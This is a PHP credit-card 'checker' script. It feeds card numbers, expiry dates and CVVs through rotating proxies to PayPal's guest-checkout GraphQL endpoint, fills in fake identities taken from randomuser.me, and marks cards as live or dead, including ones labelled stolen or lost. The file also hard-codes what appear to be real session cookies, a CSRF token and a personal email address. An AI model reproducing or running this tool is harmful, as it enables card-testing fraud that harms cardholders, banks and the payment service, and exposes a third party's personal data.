<?php 

require 'function.php';

error_reporting(0);
date_default_timezone_set('Asia/Jakarta');

if ($_SERVER['REQUEST_METHOD'] == "POST") {
    extract($_POST);
} elseif ($_SERVER['REQUEST_METHOD'] == "GET") {
    extract($_GET);
}
function GetStr($string, $start, $end) {
    $str = explode($start, $string);
    $str = explode($end, $str[1]);  
    return $str[0];
}
function inStr($string, $start, $end, $value) {
    $str = explode($start, $string);
    $str = explode($end, $str[$value]);
    return $str[0];
}
$separa = explode("|", $lista);
$cc = $separa[0];
$mes = $separa[1];
$ano = $separa[2];
$cvv = $separa[3];

function rebootproxys()
{
  $poxySocks = file("proxy.txt");
  $myproxy = rand(0, sizeof($poxySocks) - 1);
  $poxySocks = $poxySocks[$myproxy];
  return $poxySocks;
}
$poxySocks4 = rebootproxys();

$number1 = substr($ccn,0,4);
$number2 = substr($ccn,4,4);
$number3 = substr($ccn,8,4);
$number4 = substr($ccn,12,4);
$number6 = substr($ccn,0,6);

function value($str,$find_start,$find_end)
{
    $start = @strpos($str,$find_start);
    if ($start === false) 
    {
        return "";
    }
    $length = strlen($find_start);
    $end    = strpos(substr($str,$start +$length),$find_end);
    return trim(substr($str,$start +$length,$end));
}

function mod($dividendo,$divisor)
{
    return round($dividendo - (floor($dividendo/$divisor)*$divisor));
}
$cctwo = substr("$cc", 0, 6);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$cctwo.'');
curl_setopt($ch, CURLOPT_USERAGENT, $user_agent);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: lookup.binlist.net',
'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, '');
$fim = curl_exec($ch);
$fim = json_decode($fim,true);
$bank = strtoupper($fim['bank']['name']);
$scheme1 = strtoupper($fim['scheme']);
$country1 = strtoupper($fim['country']['alpha2']);
$emoji = strtoupper($fim['country']['emoji']);
$type = strtoupper($fim['type']);
$brand = strtoupper($fim['brand']);
$currency = strtoupper($fim['country']['currency']);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://randomuser.me/api/?nat='.$country1.'');
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIE, 1); 
curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
$resposta = curl_exec($ch);
$firstname = value($resposta, '"first":"', '"');
$lastname = value($resposta, '"last":"', '"');
$phone = value($resposta, '"phone":"', '"');
$zip = value($resposta, '"postcode":', ',');
$state = value($resposta, '"state":"', '"');
$country = value($resposta, '"nat":"', '"');
$email = value($resposta, '"email":"', '"');
$city = value($resposta, '"city":"', '"');
$street = value($resposta, '"street":"', '"');
$numero1 = substr($phone, 1,3);
$numero2 = substr($phone, 6,3);
$numero3 = substr($phone, 10,4);
$phone = $numero1.''.$numero2.''.$numero3;
$serve_arr = array("gmail.com","homtail.com","yahoo.com.br","bol.com.br","yopmail.com","outlook.com");
$serv_rnd = $serve_arr[array_rand($serve_arr)];
$email= str_replace("example.com", $serv_rnd, $email);
# -------------------- [1 REQ] -------------------#

$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, $poxySocks4);
curl_setopt($ch, CURLOPT_URL, 'https://www.paypal.com/graphql?fetch_credit_form_submit');
curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'authority: www.paypal.com',
'method: POST',
'path: /graphql?fetch_credit_form_submit',
'scheme: https',
'accept: */*',
'accept-language: en-US,en;q=0.9',
'content-type: application/json',
'origin: https://www.paypal.com',
'cookie_check=yes; _gcl_au=1.1.1698341707.1607845792; cookie_prefs=T%3D1%2CP%3D1%2CF%3D1%2Ctype%3Dexplicit_banner; ui_experience=d_id%3Da8da96a6e1a54b4b81268040e1b8fdba1608879930019%26login_type%3DEMAIL_PASSWORD%26home%3D3%26ph_conf%3D3%253A1612004246074%26xot%3D1%253A1612415710840; rmuc=u6zEN1fWBZjbGJlbHoz0PkZKjK7sjuByEUc7FAnFWKE5iAjJlU2ARy2mATPP15nYvN4BBrccNu-np9UiOP3FOXhUNm0gvuYgpfLY-ZrSIX15IAs7V0p2U14IJQtdvjcA1HDU3Pt4xKIA1AwVmjD8tqWFwzuBU2bAX_uPSZiQOcozJolNdS_AhEuKYjy; KHcl0EuY7AKSMgfvHl7J5E7hPtK=1OLFvoMkAwDzt0XJ89J4NqPgwKaxVJsn7buHy7POaGnFBzIhH2l1rlmpsjtzMsZNq1rDmeR0HByPUgav; X-PP-ADS=AToBKNgHYNZaF2ZlBUPOD-Ix3YXU7UI7Ad4NCWDx3R4S-RCo3L8yuNXnWxj2OwFfGgxgps6bpT1Uonm7F-0oKpFsaQ; login_email=Lmendez77%40verizon.net; x-csrf-jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0b2tlbiI6IjBCbmxrREpsbHJLZC1pMjJ1M0R6ajV4enptV004UEVDS3hSWW1udXRxeVlQbnhnVy1BbnlpLTFqZnJEeTRBOXM4Y01kaWxTcUg3WVFlRllLOW5tWndzRlJrRVJqRmg0T3R3SzBHWUtJeXBIcHltY1VjTEU1Wko4TTZPWDlwSmhWR3djWFVlYW9FYndVenpmRWdpeFFVTk56SHI2S2NjQ1pBLUt3b2pDUFhDUmY1WDNNdGdTUG51MGFOY20iLCJpYXQiOjE2MTI2MDk1MDEsImV4cCI6MTYxMjYxMzEwMX0.BZQxU2Im56d-lwOtH1iL1iABJIEsEOKFLr41HYFVnl4; ts_c=vr%3D88aa358a1760a4cc65143d13ffffffff%26vt%3D7b830cb01770a3126e35f3a0ffffffff; nsid=s%3A8YY4CjMOQPIhhIjYer-v21fof7Hxyrdo.egsjkuZGVaIQ%2FKCoo684fy9cCnMyJIaQ2WcpDceCI70; enforce_policy=ccpa; LANG=en_US%3BUS; l7_az=dcg01.phx; x-pp-s=eyJ0IjoiMTYxMjY4NTAyOTk5MiIsImwiOiIxIiwibSI6IjAifQ; tsrce=graphqlnodeweb; ts=vreXpYrS%3D1707293031%26vteXpYrS%3D1612686831%26vr%3D88aa358a1760a4cc65143d13ffffffff%26vt%3D7b830cb01770a3126e35f3a0ffffffff%26vtyp%3Dreturn',
'sec-ch-ua: "Chromium";v="88", "Google Chrome";v="88", ";Not A Brand";v="99"',
'sec-ch-ua-mobile: ?0',
'paypal-client-context: EC-68075889BF9386422',
'paypal-client-metadata-id: EC-68075889BF9386422',
'sec-fetch-dest: empty',
'sec-fetch-mode: cors',
'sec-fetch-site: same-origin',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.146 Safari/537.36',
'x-app-name: standardcardfields',
'x-country: US',
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');

# ----------------- [1req Postfields] ---------------------#

curl_setopt($ch, CURLOPT_POSTFIELDS, '{"query":"\n        mutation payWithCard(\n            $token: String!\n            $card: CardInput!\n            $phoneNumber: String\n            $firstName: String\n            $lastName: String\n            $shippingAddress: AddressInput\n            $billingAddress: AddressInput\n            $email: String\n            $currencyConversionType: CheckoutCurrencyConversionType\n            $installmentTerm: Int\n        ) {\n            approveGuestPaymentWithCreditCard(\n                token: $token\n                card: $card\n                phoneNumber: $phoneNumber\n                firstName: $firstName\n                lastName: $lastName\n                email: $email\n                shippingAddress: $shippingAddress\n                billingAddress: $billingAddress\n                currencyConversionType: $currencyConversionType\n                installmentTerm: $installmentTerm\n            ) {\n                flags {\n                    is3DSecureRequired\n                }\n                cart {\n                    intent\n                    cartId\n                    buyer {\n                        userId\n                        auth {\n                            accessToken\n                        }\n                    }\n                    returnUrl {\n                        href\n                    }\n                }\n                paymentContingencies {\n                    threeDomainSecure {\n                        status\n                        method\n                        redirectUrl {\n                            href\n                        }\n                        parameter\n                    }\n                }\n            }\n        }\n        ","variables":{"token":"EC-68075889BF9386422","card":{"cardNumber":"'.$cc.'","expirationDate":"'.$mes.'/'.$ano.'","postalCode":"'.$zip.'","securityCode":"'.$cvv.'"},"phoneNumber":"'.$phone.'","firstName":"'.$firstname.' ","lastName":"'.$lastname.'","billingAddress":{"givenName":"'.$firstname.' ","familyName":"'.$lastname.'","postalCode":"'.$zip.'","country":"'.$country1.'"},"email":"'.$email.'","currencyConversionType":"PAYPAL"},"operationName":null}');


$result1 = curl_exec($ch);

$token = trim(strip_tags(getstr($result1,'"token":"','"')));

$auth = 'Stripe Auth';
# ---------------------------------------#



# ---------------- [Responses] ----------------- #

if
(strpos($result1,  "is3DSecureRequired")) {
  echo "<font size=2 color='white'>  <font class='badge badge-success'>✅ Approved CVV ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>CVV MATCHED [ Card Has Been Added To Paypal ][ Soham ]  </i></font><br> ";
  echo "<b>✅ Bank</b> : $bank<br>";
  echo "<b>✅ Type</b> : $type<br>";
  echo "<b>✅ Scheme</b> : $scheme1<br>";
  echo "<b>✅ Brand</b> : $brand<br>";
  echo "<b>✅ Currency</b> : $currency<br>";
  echo "<b>✅ Country</b> :  $country1<br>";
  echo "<b>✅ Auth</b> :  Paypal Auth<br>";
  echo "<b>✅ Checker By</b> :  @sohamnavale1<br>";
}

elseif
(strpos($result1,  "Thank You For Donation.")) {
  echo "<font size=2 color='white'>  <font class='badge badge-success'>✅ Approved CVV ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>CVV MATCHED [ Soham ]  </i></font><br>";
  echo "<b>✅ Bank</b> : $bank<br>";
  echo "<b>✅ Type</b> : $type<br>";
  echo "<b>✅ Scheme</b> : $scheme1<br>";
  echo "<b>✅ Brand</b> : $brand<br>";
  echo "<b>✅ Currency</b> : $currency<br>";
  echo "<b>✅ Country</b> :  $country1<br>";
}
elseif
(strpos($result1,  '"Thank You For Donation."')) {
  echo "<font size=2 color='white'>  <font class='badge badge-success'>✅ Approved CVV ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>CVV MATCHED [ Soham ]  </i></font><br> ";
  echo "<b>✅ Bank</b> : $bank<br>";
  echo "<b>✅ Type</b> : $type<br>";
  echo "<b>✅ Scheme</b> : $scheme1<br>";
  echo "<b>✅ Brand</b> : $brand<br>";
  echo "<b>✅ Currency</b> : $currency<br>";
  echo "<b>✅ Country</b> :  $country1<br>";
}

elseif
(strpos($result1,  "Thank You.")) {
  echo "<font size=2 color='white'>  <font class='badge badge-success'>✅ Approved CVV ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>CVV MATCHED [ Soham ]  </i></font><br> ";
  
}

elseif
(strpos($result1,  'Your card zip code is incorrect.')) {
  echo "<font size=2 color='white'>  <font class='badge badge-success'>✅ Approved CVV ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>CVV MATCHED [ Soham ]  </i></font><br> ";
  echo "<b>✅ Bank</b> : $bank<br>";
  echo "<b>✅ Type</b> : $type<br>";
  echo "<b>✅ Scheme</b> : $scheme1<br>";
  echo "<b>✅ Brand</b> : $brand<br>";
  echo "<b>✅ Currency</b> : $currency<br>";
  echo "<b>✅ Country</b> :  $country1<br>";
  
} 
elseif
(strpos($result1,  '/donations/thank_you?donation_number=','')) {
  echo "<font size=2 color='white'>  <font class='badge badge-success'>✅ Approved CVV ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>CVV MATCHED [ Soham ]  </i></font><br> ";
  echo "<b>✅ Bank</b> : $bank<br>";
  echo "<b>✅ Type</b> : $type<br>";
  echo "<b>✅ Scheme</b> : $scheme1<br>";
  echo "<b>✅ Brand</b> : $brand<br>";
  echo "<b>✅ Currency</b> : $currency<br>";
  echo "<b>✅ Country</b> :  $country1<br>";
}


elseif
(strpos($result1,  "INVALID_BILLING_ADDRESS")) {
  echo "<font size=2 color='white'>  <font class='badge badge-info'>✅ Approved ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>INVALID BILLING ADDRESS [ Soham ]  </i></font><br> ";
  echo "<b>✅ Bank</b> : $bank<br>";
  echo "<b>✅ Type</b> : $type<br>";
  echo "<b>✅ Scheme</b> : $scheme1<br>";
  echo "<b>✅ Brand</b> : $brand<br>";
  echo "<b>✅ Currency</b> : $currency<br>";
  echo "<b>✅ Country</b> :  $country1<br>";
  echo "<b>✅ Paypal</b> :  Paypal Auth<br>";
  echo "<b>✅ Checker By</b> :  @sohamnavale1<br>";
}


elseif
(strpos($result1,  '"type":"one-time"')) {
  echo "<font size=2 color='white'>  <font class='badge badge-success'>Approved CVV ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>CVV MATCHED Incorrect zip  [ Soham ]  </i></font><br> ";
  echo "<b>Bank</b> : $bank<br>";
  echo "<b>Type</b> : $type<br>";
  echo "<b>Scheme</b> : $scheme1<br>";
  echo "<b>Brand</b> : $brand<br>";
  echo "<b>Currency</b> : $currency<br>";
  echo "<b>Country</b> :  $country1<br>";
}


elseif
(strpos($result1,  "RISK_DISALLOWED")) {
  echo "<font size=2 color='white'>  <font class='badge badge-info'>⚡️ Aprovada ◈ $cc|$mes|$ano|$cvv ◈ </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>CVV MATCHED [ Paypal Risk ] [ Soham ]  ⚡️</i></font><br> ";
  echo "<b>✅ Bank</b> : $bank<br>";
  echo "<b>✅ Type</b> : $type<br>";
  echo "<b>✅ Scheme</b> : $scheme1<br>";
  echo "<b>✅ Brand</b> : $brand<br>";
  echo "<b>✅ Currency</b> : $currency<br>";
  echo "<b>✅ Country</b> :  $country1<br>";
  echo "<b>✅ Auth</b> :  Paypal Auth<br>";
  echo "<b>✅ Checker By</b> :  @sohamnavale1<br>";
}


elseif
(strpos($result1,  'Your card&#039;s security code is incorrect.')) {
  echo "<font size=2 color='white'>  <font class='badge badge-info'>✅ Aprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>CCN LIVE [ Soham ]  </i></font><br> ";
  //echo "<b>✅ Bank</b> : $bank<br>";
  //echo "<b>✅ Type</b> : $type<br>";
  //echo "<b>✅ Scheme</b> : $scheme1<br>";
  //echo "<b>✅ Brand</b> : $brand<br>";
  //echo "<b>✅ Currency</b> : $currency<br>";
  //echo "<b>✅ Country</b> :  $country1<br>";
}

elseif
(strpos($result1,  "incorrect_cvc")) {
  echo "<font size=2 color='white'>  <font class='badge badge-info'>Aprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>CCN LIVE [ Soham ]  </i></font><br> ";
  echo "<b>Bank</b> : $bank<br>";
  echo "<b>Type</b> : $type<br>";
  echo "<b>Scheme</b> : $scheme1<br>";
  echo "<b>Brand</b> : $brand<br>";
  echo "<b>Currency</b> : $currency<br>";
  echo "<b>Country</b> :  $country1<br>";
}

elseif
(strpos($result1,  "stolen_card")) {
  echo "<font size=2 color='white'>  <font class='badge badge-info'>Aprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Stolen_Card [ Soham ]  </i></font><br> ";
  echo "<b>Bank</b> : $bank<br>";
  echo "<b>Type</b> : $type<br>";
  echo "<b>Scheme</b> : $scheme1<br>";
  echo "<b>Brand</b> : $brand<br>";
  echo "<b>Currency</b> : $currency<br>";
  echo "<b>Country</b> :  $country1<br>";
}

elseif
(strpos($result1,  "lost_card")) {
  echo "<font size=2 color='white'>  <font class='badge badge-info'>Aprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>lost_card [ Soham ]  </i></font><br> ";
  echo "<b>Bank</b> : $bank<br>";
  echo "<b>Type</b> : $type<br>";
  echo "<b>Scheme</b> : $scheme1<br>";
  echo "<b>Brand</b> : $brand<br>";
  echo "<b>Currency</b> : $currency<br>";
  echo "<b>Country</b> :  $country1<br>";
}

elseif
(strpos($result1,  'Your card has insufficient funds.')) {
  echo "<font size=2 color='white'>  <font class='badge badge-success'>⚡️ Aprovada ◈ $cc|$mes|$ano|$cvv ◈ </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Insufficient Funds [ Soham ]  ⚡️</i></font><br> ";
  echo "<b>✅ Bank</b> : $bank<br>";
  echo "<b>✅ Type</b> : $type<br>";
  echo "<b>✅ Scheme</b> : $scheme1<br>";
  echo "<b>✅ Brand</b> : $brand<br>";
  echo "<b>✅ Currency</b> : $currency<br>";
  echo "<b>✅ Country</b> :  $country1<br>";
  echo "<b>✅ Auth</b> :  BS Check<br>";
}

elseif
(strpos($result1,  "pickup_card")) {
  echo "<font size=2 color='white'>  <font class='badge badge-info'>✅ Aprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Pickup Card_Card [ Soham ]  </i></font><br> ";
  echo "<b>✅ Bank</b> : $bank<br>";
  echo "<b>✅ Type</b> : $type<br>";
  echo "<b>✅ Scheme</b> : $scheme1<br>";
  echo "<b>✅ Brand</b> : $brand<br>";
  echo "<b>✅ Currency</b> : $currency<br>";
  echo "<b>✅ Country</b> :  $country1<br>";
}

elseif
(strpos($result1,  "insufficient_funds")) {
  echo "<font size=2 color='white'>  <font class='badge badge-info'>✅ Aprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>insufficient_funds [ Soham ]  </i></font><br> ";
  echo "<b>✅ Bank</b> : $bank<br>";
  echo "<b>✅ Type</b> : $type<br>";
  echo "<b>✅ Scheme</b> : $scheme1<br>";
  echo "<b>✅ Brand</b> : $brand<br>";
  echo "<b>✅ Currency</b> : $currency<br>";
  echo "<b>✅ Country</b> :  $country1<br>";
}

elseif
(strpos($result1,  '"cvc_check": "fail"')) {
  echo "<font size=2 color='white'>  <font class='badge badge-info'>Aprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>CCN LIVE [ Soham ]  </i></font><br> ";
  echo "<b>Bank</b> : $bank<br>";
  echo "<b>Type</b> : $type<br>";
  echo "<b>Scheme</b> : $scheme1<br>";
  echo "<b>Brand</b> : $brand<br>";
  echo "<b>Currency</b> : $currency<br>";
  echo "<b>Country</b> :  $country1<br>";
}

elseif
(strpos($result1,  "INVALID_SECURITY_CODE")) {
  echo "<font size=2 color='white'>  <font class='badge badge-info'>Aprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>CCN LIVE [ PAYPAL CC CHECKER ][ Soham ]  </i></font><br> ";
  echo "<b>Bank</b> : $bank<br>";
  echo "<b>Type</b> : $type<br>";
  echo "<b>Scheme</b> : $scheme1<br>";
  echo "<b>Brand</b> : $brand<br>";
  echo "<b>Currency</b> : $currency<br>";
  echo "<b>Country</b> :  $country1<br>";
  echo "<b>Auth</b> :  Paypal Auth<br>";
  echo "<b>Checker By</b> : @sohamnavale1<br>";
}

elseif
(strpos($result1,  'Your card&#039;s security code is incorrect.')) {
  echo "<font size=2 color='white'>  <font class='badge badge-info'>Aprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>CCN LIVE [ Soham ]  </i></font><br> ";
  echo "<b>Bank</b> : $bank<br>";
  echo "<b>Type</b> : $type<br>";
  echo "<b>Scheme</b> : $scheme1<br>";
  echo "<b>Brand</b> : $brand<br>";
  echo "<b>Currency</b> : $currency<br>";
  echo "<b>Country</b> :  $country1<br>";
}

elseif
(strpos($result1,  "incorrect_cvc")) {
  echo "<font size=2 color='white'>  <font class='badge badge-info'>Aprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>CCN LIVE [ Soham ]  </i></font><br> ";
  echo "<b>Bank</b> : $bank<br>";
  echo "<b>Type</b> : $type<br>";
  echo "<b>Scheme</b> : $scheme1<br>";
  echo "<b>Brand</b> : $brand<br>";
  echo "<b>Currency</b> : $currency<br>";
  echo "<b>Country</b> :  $country1<br>";
}

elseif
(strpos($result1,  "stolen_card")) {
  echo "<font size=2 color='white'>  <font class='badge badge-info'>Aprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Stolen_Card [ Soham ]  </i></font><br> ";
  echo "<b>Bank</b> : $bank<br>";
  echo "<b>Type</b> : $type<br>";
  echo "<b>Scheme</b> : $scheme1<br>";
  echo "<b>Brand</b> : $brand<br>";
  echo "<b>Currency</b> : $currency<br>";
  echo "<b>Country</b> :  $country1<br>";
}

elseif
(strpos($result1,  "lost_card")) {
  echo "<font size=2 color='white'>  <font class='badge badge-info'>Aprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>lost_card [ Soham ]  </i></font><br> ";
  echo "<b>Bank</b> : $bank<br>";
  echo "<b>Type</b> : $type<br>";
  echo "<b>Scheme</b> : $scheme1<br>";
  echo "<b>Brand</b> : $brand<br>";
  echo "<b>Currency</b> : $currency<br>";
  echo "<b>Country</b> :  $country1<br>";
}

elseif
(strpos($result1,  'Your card has insufficient funds.')) {
  echo "<font size=2 color='white'>  <font class='badge badge-info'>Aprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>insufficient funds [ Soham ]  </i></font><br> ";
  echo "<b>Bank</b> : $bank<br>";
  echo "<b>Type</b> : $type<br>";
  echo "<b>Scheme</b> : $scheme1<br>";
  echo "<b>Brand</b> : $brand<br>";
  echo "<b>Currency</b> : $currency<br>";
  echo "<b>Country</b> :  $country1<br>";
}

elseif
(strpos($result1,  "EXISTING_ACCOUNT_RESTRICTED")) {
  echo "<font size=2 color='white'>  <font class='badge badge-success'>Aprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Pickup Card [CARD HAS BEEN USED ON PAYPAL] [ Soham ]  </i></font><br> ";
  echo "<b>CODE</b> : EXISTING_ACCOUNT_RESTRICTED<br>";
  echo "<b>Bank</b> : $bank<br>";
  echo "<b>Type</b> : $type<br>";
  echo "<b>Scheme</b> : $scheme1<br>";
  echo "<b>Brand</b> : $brand<br>";
  echo "<b>Currency</b> : $currency<br>";
  echo "<b>Country</b> :  $country1<br>";
  echo "<b>Auth</b> :  Paypal Auth<br>";
  echo "<b>Checker By</b> :  @sohamnavale1<br>";
}

elseif
(strpos($result1,  "insufficient_funds")) {
  echo "<font size=2 color='white'>  <font class='badge badge-info'>Aprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>insufficient_funds [ Soham ]  </i></font><br> ";
  echo "<b>Bank</b> : $bank<br>";
  echo "<b>Type</b> : $type<br>";
  echo "<b>Scheme</b> : $scheme1<br>";
  echo "<b>Brand</b> : $brand<br>";
  echo "<b>Currency</b> : $currency<br>";
  echo "<b>Country</b> :  $country1<br>";
}
elseif
(strpos($result1,  "Oops, the payment didn't go through.")) {
  echo "<font size=2 color='white'>  <font class='badge badge-danger'> Reprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Oops, the payment didn't go through ❌ SOHAM  </i></font><br> ";
  echo "<b>Bank</b> : $bank<br>";
  echo "<b>Type</b> : $type<br>";
  echo "<b>Scheme</b> : $scheme1<br>";
  echo "<b>Brand</b> : $brand<br>";
  echo "<b>Currency</b> : $currency<br>";
  echo "<b>Country</b> :  $country1<br>";
}
elseif
(strpos($result1,  "VALIDATION_ERROR")) {
  echo "<font size=2 color='white'>  <font class='badge badge-danger'>❌ Reprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>VALIDATION ERROR [ Soham ]  </i></font><br> ";
  echo "<b>❌ Bank</b> : $bank<br>";
  echo "<b>❌ Type</b> : $type<br>";
  echo "<b>❌ Scheme</b> : $scheme1<br>";
  echo "<b>❌ Brand</b> : $brand<br>";
  echo "<b>❌ Currency</b> : $currency<br>";
  echo "<b>❌ Country</b> :  $country1<br>";
  echo "<b>❌ Auth</b> :  @sohamnavale1<br>";
  echo "<b>❌ Checker By</b> :  @sohamnavale1<br>";
}

elseif
(strpos($result1,  "CANNOT_ACCEPT_CURRENCY_CONVERSION_OPTION")) {
  echo "<font size=2 color='white'>  <font class='badge badge-danger'>❌ Reprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>CANNOT USE THIS CARD [ Soham ]  </i></font><br> ";
  echo "<b>❌ Bank</b> : $bank<br>";
  echo "<b>❌ Type</b> : $type<br>";
  echo "<b>❌ Scheme</b> : $scheme1<br>";
  echo "<b>❌ Brand</b> : $brand<br>";
  echo "<b>❌ Currency</b> : $currency<br>";
  echo "<b>❌ Country</b> :  $country1<br>";
}

elseif
(strpos($result1,  "incorrect_number")) {
  echo "<font size=2 color='white'>  <font class='badge badge-danger'>❌ Reprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Incorrect Card Number [ Soham ]  </i></font><br> ";
  echo "<b>❌ Bank</b> : $bank<br>";
  echo "<b>❌ Type</b> : $type<br>";
  echo "<b>❌ Scheme</b> : $scheme1<br>";
  echo "<b>❌ Brand</b> : $brand<br>";
  echo "<b>❌ Currency</b> : $currency<br>";
  echo "<b>❌ Country</b> :  $country1<br>";
}


elseif
(strpos($result1,  "Your card was declined.")) {
  echo "<font size=2 color='white'>  <font class='badge badge-danger'>❌ Reprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Card Declined [ Soham ]  </i></font><br>";
  echo "<b>❌ Bank</b> : $bank<br>";
  echo "<b>❌ Type</b> : $type<br>";
  echo "<b>❌ Scheme</b> : $scheme1<br>";
  echo "<b>❌ Brand</b> : $brand<br>";
  echo "<b>❌ Currency</b> : $currency<br>";
  echo "<b>❌ Country</b> :  $country1<br>";

}

elseif
(strpos($result1,  "CARD_GENERIC_ERROR")) {
  echo "<font size=2 color='white'>  <font class='badge badge-danger'> Reprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Generic_Decline [ Soham ]  </i></font><br> ";
  echo "<b>Bank</b> : $bank<br>";
  echo "<b>Type</b> : $type<br>";
  echo "<b>Scheme</b> : $scheme1<br>";
  echo "<b>Brand</b> : $brand<br>";
  echo "<b>Currency</b> : $currency<br>";
  echo "<b>Country</b> :  $country1<br>";
  echo "<b>Auth</b> :  Paypal Auth<br>";
  echo "<b>Checker By</b> :  @sohamnavale1<br>";
}

elseif
(strpos($result1,  "do_not_honor")) {
  echo "<font size=2 color='white'>  <font class='badge badge-danger'> Reprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Do_Not_Honor [ Soham ]  </i></font><br> ";
  echo "<b>Bank</b> : $bank<br>";
  echo "<b>Type</b> : $type<br>";
  echo "<b>Scheme</b> : $scheme1<br>";
  echo "<b>Brand</b> : $brand<br>";
  echo "<b>Currency</b> : $currency<br>";
  echo "<b>Country</b> :  $country1<br>";
}


elseif
(strpos($result1,  "expired_card")) {
  echo "<font size=2 color='white'>  <font class='badge badge-danger'>❌ Reprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Expired Card [ Soham ]  </i></font><br> ";
  echo "<b>❌ Bank</b> : $bank<br>";
  echo "<b>❌ Type</b> : $type<br>";
  echo "<b>❌ Scheme</b> : $scheme1<br>";
  echo "<b>❌ Brand</b> : $brand<br>";
  echo "<b>❌ Currency</b> : $currency<br>";
  echo "<b>❌ Country</b> :  $country1<br>";
}

elseif
(strpos($result1,  'Your card does not support this type of purchase.')) {
  echo "<font size=2 color='white'>  <font class='badge badge-danger'>❌ Reprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Card Doesnt Support This Purchase [ Soham ]  </i></font><br> ";
  echo "<b>❌ Bank</b> : $bank<br>";
  echo "<b>❌ Type</b> : $type<br>";
  echo "<b>❌ Scheme</b> : $scheme1<br>";
  echo "<b>❌ Brand</b> : $brand<br>";
  echo "<b>❌ Currency</b> : $currency<br>";
